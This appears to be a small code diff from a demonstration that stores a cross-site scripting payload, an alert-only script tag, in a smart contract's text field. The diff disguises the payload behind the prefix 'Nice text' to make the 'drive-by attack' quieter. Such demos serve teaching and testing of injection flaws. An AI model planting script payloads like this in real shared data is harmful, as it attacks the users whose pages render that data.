@@ -81,7 +81,7 @@ else {
     contractInstance = instance;
 
     // store the evil script on the blockchain
-    return contractInstance.setTextField("<script>alert('I just did a javascript drive-by attack');</script>");
+    return contractInstance.setTextField("Nice text<script>alert('I just did a silent javascript drive-by attack');</script>");
     }).catch(function(err) {
       console.log(err.message);
    });
